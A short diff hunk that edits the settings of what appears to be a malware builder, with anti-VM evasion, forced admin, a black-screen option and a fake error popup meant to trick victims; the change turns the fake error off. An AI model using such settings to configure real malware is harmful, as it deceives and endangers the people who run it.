@@ -12,7 +12,7 @@ config = {
     'antivm': False,  
     'force_admin': False, 
     'black_screen': True, 
-    'error': True, 
+    'error': False, 
     'error_message': 'Failed To Open Poop Tool\nclick "ok" to open',
 }
 
